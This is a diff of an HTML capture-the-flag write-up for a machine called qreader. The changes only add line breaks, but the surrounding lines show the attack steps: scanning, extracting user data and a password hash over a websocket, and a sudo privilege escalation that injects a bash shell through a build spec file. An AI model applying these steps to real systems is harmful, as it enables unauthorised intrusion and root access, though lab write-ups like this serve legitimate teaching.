@@ -169,7 +169,7 @@ body {
 <code><span class="ve">❯ command </span><span class="p">used
 sudo nmap -sV -sC -A 10.10.11.206
   </span>
-</code></pre></div></div>         
+</code></pre></div></div><br>        
           
 <p><img src="https://miro.medium.com/v2/resize:fit:700/0*17K1xym-FAzLGeA0.png" alt=""></p>
 <p><strong>Scan Result:</strong></p>
@@ -183,7 +183,7 @@ sudo nmap -sV -sC -A 10.10.11.206
 <code><span class="ve">❯ command </span><span class="p">used
 python3 STEWS-vuln-detect.py -1 -n -u 10.10.11.206:5789
   </span>
-</code></pre></div></div>         
+</code></pre></div></div><br>         
           
 <p><img src="https://miro.medium.com/v2/resize:fit:700/0*7urD5zisq7WEzgUu.png" alt=""></p>
 <p>We came to know about a vulnerable url which is  <strong>ws://qreader.htb:5789</strong></p>
@@ -200,7 +200,7 @@ python3 STEWS-vuln-detect.py -1 -n -u 10.10.11.206:5789
 <code><span class="ve">❯ command </span><span class="p">used
 python3 pyinstxtractor.py qreader.exe
   </span>
-</code></pre></div></div>  
+</code></pre></div></div><br> 
   
 <p><img src="https://miro.medium.com/v2/resize:fit:700/0*4NGSjNybLp9Qam1C.png" alt=""></p>
 <p>Now go to extracted folder &amp; and examine the qreader.pyc file.</p>
@@ -211,7 +211,7 @@ pip3 install uncompyle6
 
 uncompyle6 qreader.pyc > qreader.py
   </span>
-</code></pre></div></div>
+</code></pre></div></div><br>
 
 <p>After analyzing the qreader.py file we found the vulnerability as you can see below.</p>
 <p><img src="https://miro.medium.com/v2/resize:fit:700/0*xCCvX9ZxTyzgUTM9.png" alt=""></p>
@@ -229,7 +229,7 @@ result = ws.recv()
 print(result)
 ws.close()
   </span>
-</code></pre></div></div> 
+</code></pre></div></div><br> 
 
 <p>Above code will print all the user as shown below.</p>
 <p><img src="https://miro.medium.com/v2/resize:fit:700/0*hB3PqA9MMkATMzL0.png" alt=""></p>
@@ -247,7 +247,7 @@ result = ws.recv()
 print(result)
 ws.close()
   </span>
-</code></pre></div></div> 
+</code></pre></div></div><br> 
 
 <p><img src="https://miro.medium.com/v2/resize:fit:700/0*RD0P0UrNL-iKcntz.png" alt=""></p>
 <p>As you can see we got our password and we can decrypt this at crackstation.net website as shown below.</p>
@@ -267,7 +267,7 @@ echo 'import os;os.system("/bin/bash")' > root.spec
 
 sudo /usr/local/sbin/build-installer.sh build root.spec
   </span>
-</code></pre></div></div>
+</code></pre></div></div><br>
           
 <p><img src="https://miro.medium.com/v2/resize:fit:700/0*pzmMd1xHQNkTyuC9.png" alt=""></p>
 <p>As you can see we got our root flag.</p>
